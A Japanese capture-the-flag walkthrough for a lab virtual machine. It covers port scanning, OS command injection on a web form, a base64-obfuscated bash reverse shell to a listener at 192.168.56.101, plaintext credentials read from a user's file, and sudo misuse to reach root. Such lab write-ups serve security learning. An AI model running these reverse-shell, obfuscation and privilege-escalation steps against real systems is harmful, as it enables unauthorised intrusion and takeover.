## 論点
- ncコマンドでtcpポートに接続
- reverse-shellの暗号化
  - 問題 `ls -la`コマンドをlsと書かずに実行する
  - <details><summary>答え</summary>
    
    `echo bHMgLWxh | base64 -d | bash`
    
    </details>

## 攻略
- nmap
  - 21,22(filtered),1337,7331 
- webサイトを見る
  - 1337ポートは見れないので、7331ポートをみる。特に何もない
- 1337ポートを見る
  - tcpポートが開いているのでncコマンドで接続する
  - `nc $IP 1337`
  - 算数の計算ができるが、特に得るものはない
- 7331ポートでgobuster
  - 大きな辞書を使う
  - `/wish/`,`/genie/` 
- webサイトを見る
  - genieはエラーが出るので、/wish/をみると何かできそう
- osコマンドインジェクション
  - 入力欄に`id`をすると、リダイレクトされたURLのところに結果が返ってくる
- reverse-shell
  - `bash -i >& /dev/tcp/192.168.56.101/9001 0>&1`
  - ~には`bash -i `のリバースシェルのbase64で変換したものを入れる
  - `echo ~ | base64 -d | bash` 
  - Parrotで待ち受ける
  - もしParrotに通知は来てるが、shellが使えない場合はコードが間違っているのでもう一度見直す
  - 実行する
- 対話型シェルにする(www-dataで侵入) 
- system内を探索する
  - `ls /home` userが2人いる
  - `cd /opt`に80というディレクトリがある。入ってみると、初めに接続したところに戻ってきた
  -  lsコマンドにapp.pyに/home/nitish/.dev/creds.txtという気になるファイルを指しているので見る
  - (追記)app.pyのコードをよく読むとRCEというのがある。要はここに含まれている記号はosコマンドインジェクションでは使えない
  - ユーザ名とパスワードがある
- 水平展開
  - su nitish
- nitish
  - id 特になし
- suid
  - pkexecがある。genieという謎のがある
- sudo -l
  - genieコマンドがあるが使い方がわからんのでhelpを見て、いろいろ試すがよくわからん。
  - `strings /usr/bin/genie`をすると`-cmd`というhelpに出てこなかったオプションがあるので、これを試す。whoamiは適当
  - `sudo -u sam genie -cmd whoami`
- sam
  - id 特になし
- sudo -l
  - bashにするとシェルになる
  - /root/lago
  - `sudo /root/lago`
  - なんかよくわからん問題みたいの出てくる
  - `strings /root/lago`を見ると、2を選択してnumを入力すると/bin/shが実行される
  - もう一度 `sudo /root/lagl`して2を押す、numを入力する
- rootになる 
